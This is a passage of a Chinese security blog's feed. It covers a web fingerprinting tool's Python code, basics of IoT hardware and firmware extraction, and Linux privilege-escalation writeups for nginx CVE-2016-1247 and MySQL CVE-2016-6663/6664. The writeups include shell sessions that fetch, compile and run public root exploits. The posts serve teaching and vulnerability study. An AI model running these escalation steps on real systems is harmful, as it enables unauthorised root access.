__   /\ \__/ /\_\     ___       __       __   _ __  </span></span><br><span class="line"><span class="string">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</span></span><br><span class="line"><span class="string">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </span></span><br><span class="line"><span class="string">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </span></span><br><span class="line"><span class="string">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </span></span><br><span class="line"><span class="string">                                                 /\____/             </span></span><br><span class="line"><span class="string">                                                 \_/__/ </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</span><br><span class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</span><br><span class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</span><br><span class="line">    options, arguments = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</span><br><span class="line">        parser.print_help() </span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    db = MySQL(config.db_config)</span><br><span class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</span><br><span class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</span><br><span class="line">    fingers = db.fetch_all()</span><br><span class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</span><br><span class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </span><br><span class="line">    config.set(<span class="string">"fingers"</span>,fingers)</span><br><span class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</span><br><span class="line">    finger.get_web_app(options.url)</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109322329056.jpg" alt="img"></p><h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p><h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p><h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" target="_blank" rel="noopener">https://github.com/yaseng/yafinger</a></p><h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol><li>指纹库需要补充</li><li>可以不局限于web指纹</li><li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
      
    
    </summary>
    
      <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="指纹识别" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-硬件分析初探</title>
    <link href="http://yaseng.org/iot-security-hardware-analysis.html"/>
    <id>http://yaseng.org/iot-security-hardware-analysis.html</id>
    <published>2017-11-16T16:00:00.000Z</published>
    <updated>2018-06-29T10:55:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。</p><h2 id="芯片"><a href="#芯片" class="headerlink" title="芯片"></a>芯片</h2><h3 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h3><p>常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。<br>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。<br>常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。<br>在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image17.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image18.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image19.jpg" alt=""></p><h3 id="Flash芯片"><a href="#Flash芯片" class="headerlink" title="Flash芯片"></a>Flash芯片</h3><p>FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image20.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image21.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image22.jpg" alt=""></p><p>根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。<br>其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。<br>我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image23.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image24.jpg" alt=""></p><h3 id="芯片印字"><a href="#芯片印字" class="headerlink" title="芯片印字"></a>芯片印字</h3><p> 一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。<br> 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下：</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image25.jpg" alt=""></p><h2 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h2><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。<br>编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image26.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image27.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image28.jpg" alt=""></p><h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><p>串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image29.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image30.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image31.jpg" alt=""></p><h3 id="RS-232"><a href="#RS-232" class="headerlink" title="RS-232"></a>RS-232</h3><p>通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。</p><h3 id="RS-422"><a href="#RS-422" class="headerlink" title="RS-422"></a>RS-422</h3><p>RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。</p><h3 id="RS-485"><a href="#RS-485" class="headerlink" title="RS-485"></a>RS-485</h3><p> RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。</p><h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p> spi是串行外设接口（Serial Peripheral Interface）的缩写。SPI，是一种高速的，全双工，同步的通信总线，并且在芯片的管脚上只占用四根线，节约了芯片的管脚，同时为PCB的布局上节省空间，提供方便，正是出于这种简单易用的特性，如今越来越多的芯片集成了这种通信协议，比如AT91RM9200。</p><h3 id="I2C"><a href="#I2C" class="headerlink" title="I2C"></a>I2C</h3><p> I2C 即Inter-Integrated Circuit(集成电路总线），这种总线类型是由飞利浦半导体公司在八十年代初设计出来的一种简单、双向、二线制、同步串行总线，主要是用来连接整体电路(ICS) ，IIC是一种多向控制总线，也就是说多个芯片可以连接到同一总线结构下，同时每个芯片都可以作为实时数据传输的控制源。这种方式简化了信号传输总线接口。</p><h2 id="信号分析"><a href="#信号分析" class="headerlink" title="信号分析"></a>信号分析</h2><h3 id="示波器分析"><a href="#示波器分析" class="headerlink" title="示波器分析"></a>示波器分析</h3><p>示波器是一种用途十分广泛的电子测量仪器。它能把肉眼看不见的电信号变换成看得见的图像，便于人们研究各种电现象的变化过程。示波器利用狭窄的、由高速电子组成的电子束，打在涂有荧光物质的屏面上，就可产生细小的光点（这是传统的模拟示波器的工作原理）。在被测信号的作用下，电子束就好像一支笔的笔尖，可以在屏面上描绘出被测信号的瞬时值的变化曲线。利用示波器能观察各种不同信号幅度随时间变化的波形曲线，还可以用它测试各种不同的电量，如电压、电流、频率、相位差、调幅度等等。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/IMG_3237.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/IMG_3239.jpg" alt=""></p><p>通过分析电路结构，找到待测的引脚和信号源，分析其信号变化和具体的信号形式,得到模拟信号和经过外部AD转换信号的波形图。</p><h3 id="逻辑分析仪"><a href="#逻辑分析仪" class="headerlink" title="逻辑分析仪"></a>逻辑分析仪</h3><p>逻辑分析仪是分析数字系统逻辑关系的仪器。逻辑分析仪是属于数据域测试[2]仪器中的一种总线分析仪，即以总线（多线）概念为基础，同时对多条数据线上的数据流进行观察和测试的仪器，这种仪器对复杂的数字系统的测试和分析十分有效。逻辑分析仪是利用时钟从测试设备上采集和显示数字信号的仪器，最主要作用在于时序判定。由于逻辑分析仪不像示波器那样有许多电压等级，通常只显示两个电压（逻辑1和0），因此设定了参考电压后，逻辑分析仪将被测信号通过比较器进行判定，高于参考电压者为High,低于参考电压者为Low，在High与 Low之间形成数字波形。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d5b3314fe.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d8d59bfb5.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d5c7b5319.jpg" alt=""></p><p>通过连接待测设备的接口，分析其中通信数据，通过协议转码，可以得到具体的16进制数据。</p><h2 id="设备拆解"><a href="#设备拆解" class="headerlink" title="设备拆解"></a>设备拆解</h2><p>对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image104.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ac1a60b9.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ac7644b8.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ad527734.jpg" alt=""></p><p>维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，热风枪和焊台用来拆焊各类元器件和芯片，BGA焊台用于拆焊BGA封装的芯片。</p><h2 id="常见物联网智能设备"><a href="#常见物联网智能设备" class="headerlink" title="常见物联网智能设备"></a>常见物联网智能设备</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image105.jpg" alt=""></p><p>共享充电宝，采用gprs模块配合物联卡与云端通信</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image106.jpg" alt=""></p><p>蓝牙挂锁，通过蓝牙芯片与手机配对通信，<br>蓝牙控制电机驱动，使卡锁运转</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image107.jpg" alt=""></p><p>共享充电宝，采用GSM模块加蓝牙模块控制通信</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image108.jpg" alt=""></p><p>智能锁，WIFI芯片加蓝牙芯片配合控制，外接指纹识别传感器</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image109.jpg" alt=""></p><p>智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image110.jpg" alt=""></p><p>网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image111.jpg" alt=""></p><p>智能路由器，高容量内存搭配智能OS</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image112.jpg" alt=""></p><p>智能家居控制终端，高性能WIFI收发中继控制</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image113.jpg" alt=""></p><p>智能保险柜，采用WIFI芯片控制加指纹识别传感器</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image114.jpg" alt=""></p><p>无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.china-cic.cn/" target="_blank" rel="noopener">http://www.china-cic.cn/</a>  中国通信协会相关文献<br> <a href="https://www.eia.gov/" target="_blank" rel="noopener">https://www.eia.gov/</a>  美国电子工业协会相关标准</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux 应用权限不当可提权系统漏洞</title>
    <link href="http://yaseng.org/linux-file-permissions-security.html"/>
    <id>http://yaseng.org/linux-file-permissions-security.html</id>
    <published>2016-11-24T09:20:25.000Z</published>
    <updated>2018-05-08T12:44:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>linux以强大的文件管理系统著称，在实际使用中，虽然能为工作提供极大便利，然而如果权限处理不当，可能会造成一定的安全风险，如在操作文件时，会改变某些文件夹的权限，当利用一些可以随意穿越的符号链接时，可以使相应文件指向系统文件，越权修改系统文件权限，攻击者利用此原理，劫持so库，或修改启动定时脚本，从而提权。</p><a id="more"></a><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="Nginx-CVE-2016-1247"><a href="#Nginx-CVE-2016-1247" class="headerlink" title="Nginx  CVE-2016-1247"></a>Nginx  CVE-2016-1247</h3><p><strong>影响版本</strong><br>Debian*</p><p><strong>漏洞原理</strong><br>Debian* 默认apt-get 安装的nginx 会把日志目录的所有者设置为  www-data</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaseng@ubuntu:/tmp$ ls  -ld  /var/<span class="built_in">log</span>/nginx/</span><br><span class="line">drwxr-x--- 2 www-data adm 4096 Nov 21 17:42 /var/<span class="built_in">log</span>/nginx/</span><br></pre></td></tr></table></figure><p>攻击者可以把目录下的日志文件修改为一个符号链接,指向一个没有权限写的文件,例如<br>/etc/ld.so.preload（共享库),当nginx 重启时会修改/etc/ld.so.preload<br>权限为 www-data ,这样就可以劫持环境提权到 root 。<br>nginx 有一个定时脚本(/etc/logrotate.d/nginx）每天 6:25 会重启 ,并且重新设置日志权限 ,只需写一个脚本监听 /etc/ld.so.preload 是否可写然后覆盖一个提权的 so 文件进去即可。<br><strong>漏洞测试</strong><br>环境: Ubuntu 15.04<br>exiloit : <a href="http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a><br>安装  sudo apt-get install nginx<br>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">pwd</span></span><br><span class="line">/tmp</span><br><span class="line">www-data@ubuntu:/tmp$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@ubuntu:/tmp$ file  4.sh </span><br><span class="line">4.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">www-data@ubuntu:/tmp$ ./4.sh  /var/<span class="built_in">log</span>/nginx/error.log</span><br></pre></td></tr></table></figure><p>等待nginx 重启,获取root权限<br><img src="/uploads/2016/11/14799665735069.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br>修改日志权限为 root 。</p><h3 id="MySQL-CVE-2016-6663"><a href="#MySQL-CVE-2016-6663" class="headerlink" title="MySQL  CVE-2016-6663"></a>MySQL  CVE-2016-6663</h3><p><strong>影响版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">MariaDB </span><br><span class="line">&lt; 5.5.52</span><br><span class="line">&lt; 10.1.18</span><br><span class="line">   &lt; 10.0.28</span><br><span class="line">MySQL  </span><br><span class="line">&lt;= 5.5.51</span><br><span class="line">&lt;= 5.6.32</span><br><span class="line">&lt;= 5.7.14</span><br><span class="line">Percona Server</span><br><span class="line">&lt; 5.5.51-38.2</span><br><span class="line">&lt; 5.6.32-78-1</span><br><span class="line">&lt; 5.7.14-8</span><br><span class="line">Percona XtraDB Cluster</span><br><span class="line">&lt; 5.6.32-25.17</span><br><span class="line">&lt; 5.7.14-26.17</span><br><span class="line">&lt; 5.5.41-37.0</span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong><br>MySQL以及其衍生版本在执行修复表( repair table  xxx)业务时会产生一个临时文件 xxx.TMD,赋予 xxx.TMD 一个 mysql  user 权限的SUID,由于MySQL的数据文件夹是可控的,如在赋予权限之前替换掉 TMD 文件(例如 /bin/bash/),就可以获得 mysql-suid 交互式shell 。从web 权限提升到  mysql  user。</p><p><strong>漏洞测试</strong><br>环境: Ubuntu 15.04  Mysql 5.6.28<br>exploit:<a href="http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c" target="_blank" rel="noopener">http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yaseng@ubuntu:/tmp$ sudo apt-get install mysql-server mysql-client</span><br><span class="line">yaseng@ubuntu:/tmp$ sudo   service  mysqld  restart </span><br><span class="line">yaseng@ubuntu:/tmp$ wget http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</span><br><span class="line">yaseng@ubuntu:/tmp$ gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient </span><br><span class="line">yaseng@ubuntu:/tmp$ ./mysql-privesc-race <span class="built_in">test</span> <span class="built_in">test</span> localhost <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>截图<br><img src="/uploads/2016/11/14799682334452.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br><a href="https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291" target="_blank" rel="noopener">https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291</a></p><h3 id="MySQL-CVE-2016-6664"><a href="#MySQL-CVE-2016-6664" class="headerlink" title="MySQL  CVE-2016-6664"></a>MySQL  CVE-2016-6664</h3><p><strong>影响版本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MySQL  </span><br><span class="line">&lt;= 5.5.51</span><br><span class="line">&lt;= 5.6.32</span><br><span class="line">&lt;= 5.7.14</span><br><span class="line"></span><br><span class="line">MariaDB</span><br><span class="line">All current</span><br><span class="line"></span><br><span class="line">Percona Server</span><br><span class="line">&lt; 5.5.51-38.2</span><br><span class="line">&lt; 5.6.32-78-1</span><br><span class="line">&lt; 5.7.14-8</span><br><span class="line"></span><br><span class="line">Percona XtraDB Cluster</span><br><span class="line">&lt; 5.6.32-25.17</span><br><span class="line">&lt; 5.7.14-26.17</span><br><span class="line">&lt; 5.5.41-37.0</span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong><br>同 nginx 提权相似,MySQL 日志目录/var/log/mysql 权限为 mysql 。当以==mysqld_safe== 启动时。会执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--------[ mysqld_safe ]--------</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  rm -f <span class="string">"<span class="variable">$pid_file</span>"</span>     <span class="comment"># Some extra safety</span></span><br><span class="line"></span><br><span class="line">  start_time=`date +%M%S`</span><br><span class="line"></span><br><span class="line">  eval_log_error <span class="string">"<span class="variable">$cmd</span>"</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$want_syslog</span> -eq 0 -a ! -f <span class="string">"<span class="variable">$err_log</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    touch <span class="string">"<span class="variable">$err_log</span>"</span>                    <span class="comment"># hypothetical: log was renamed but not</span></span><br><span class="line">    chown <span class="variable">$user</span> <span class="string">"<span class="variable">$err_log</span>"</span>              <span class="comment"># flushed yet. we'd recreate it with</span></span><br><span class="line">    chmod <span class="string">"<span class="variable">$fmode</span>"</span> <span class="string">"<span class="variable">$err_log</span>"</span>           <span class="comment"># wrong owner next time we log, so set</span></span><br><span class="line">  <span class="keyword">fi</span>                                    <span class="comment"># it up correctly while we can!</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>当利用CVE-2016-6663 获取到一个mysql  user ,可以直接kill mysqld 从而触发脚本，两个漏洞结合可以从webshell 直接提升到Linux root  。</p><p><strong>漏洞测试</strong><br>环境: Ubuntu 15.04  Mysql 5.6.28<br>exploit:<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a></p><p>如图<br><img src="/uploads/2016/11/14799744830723.jpg" alt="">￼</p><p><strong>漏洞修复</strong><br>修改日志权限为 root 。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以在源码和脚本中找chmod 关键词发现类似的漏洞,利用符号链接和 so 共享库劫持提权也值得学习。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></li><li><a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a></li><li><a href="http://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html" target="_blank" 